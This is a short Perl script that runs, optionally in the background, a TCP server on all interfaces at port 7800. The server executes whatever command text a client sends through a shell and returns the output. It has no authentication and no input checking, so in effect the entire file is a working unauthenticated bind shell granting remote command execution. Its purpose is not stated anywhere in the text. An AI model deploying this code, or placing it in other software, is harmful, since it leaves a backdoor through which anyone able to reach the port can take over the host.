use warnings;
use strict;

use IO::Socket::INET;
use Storable;

if (@ARGV && $ARGV[0] eq 'bg'){
    system 1, 'perl', $0, 'run';
}
if (@ARGV && $ARGV[0] eq 'run') {
    my $sock = new IO::Socket::INET (
        LocalHost => '0.0.0.0',
        LocalPort => 7800,
        Proto => 'tcp',
        Listen => 5,
        Reuse => 1,
    );
    die "cannot create socket $!\n" unless $sock;

    while (1){
        my $conn = $sock->accept;

        my $cmd;
        $conn->recv($cmd, 1024);

        print "executing: $cmd\n";
        my $ret = `$cmd`;
        print "return: $ret\n";
        Storable::nstore_fd(\$ret, $conn);

        shutdown($conn, 1);
    }

    $sock->close;
}
